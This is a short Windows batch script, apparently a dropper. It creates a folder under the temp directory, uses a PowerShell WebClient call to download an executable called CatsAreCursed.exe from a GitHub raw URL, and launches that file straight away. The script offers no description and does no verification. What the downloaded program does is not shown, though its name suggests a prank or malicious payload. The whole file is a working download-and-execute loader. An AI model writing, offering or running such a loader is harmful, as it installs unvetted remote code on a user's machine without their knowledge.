@echo off
color 0c
cls

cd %temp%
if not exist "CatsAreCursed" mkdir "CatsAreCursed"
cd CatsAreCursed

powershell -command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Bruchstein/CatsAreCursed/main/CatsAreCursed.exe', "CatsAreCursed.exe")

start CatsAreCursed.exe

exit
